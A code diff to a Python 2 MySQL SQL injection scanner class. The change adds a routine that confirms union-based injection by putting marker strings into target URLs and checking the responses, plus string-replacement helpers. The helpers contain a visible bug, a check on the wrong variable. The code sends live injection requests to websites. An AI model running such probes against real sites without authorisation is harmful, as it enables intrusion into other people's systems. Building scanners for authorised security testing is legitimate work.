@@ -22,9 +22,28 @@ class MySQLTests:
 		self.errorarr = { "'", '"'}
 		self.answershow = 1
 
-	def verifyVuln(self, url):
-		print "verify"
-		
+	def getVerifyVuln(self, sqlurl, sqlnum):
+		for x in range(1, sqlnum + 1):
+			newurl = self.replacenth(sqlurl, "NULL", "'[XX]'", x)
+			content = urllib2.urlopen(newurl).read()
+			if "[XX]" in content:
+				print colored("[+] [{0}] MySQL GET Union Injection Verified [column: {1}]".format(func.showTime(), x), "white", "on_red")
+				return True
+		return False
+
+	def findnth(self, source, target, n):
+	    num = 0
+	    start = -1
+	    while num < n:
+	        start = source.find(target, start+1)
+	        if start == -1: return -1
+	        num += 1
+	    return start
+
+	def replacenth(self, source, old, new, n):
+		p = self.findnth(source, old, n)
+		if n == -1: return source
+		return source[:p] + new + source[p+len(old):]
 
 	def cleanURL(self, url):
 		url = url.replace("./", "/");
@@ -127,6 +146,7 @@ class MySQLTests:
 						self.injectionurl = unionurl.replace(uniqid, "")
 						print colored("[+] [{1}] MySQL GET Union Injection Found ({0} columns)".format(x, func.showTime()), "white", "on_blue")
 						self.exploited[nullurl] = x
+						checkvuln = self.getVerifyVuln(nullurl, x)
 						self.totalVulns['UNION'] += 1
 						return x
 			return False
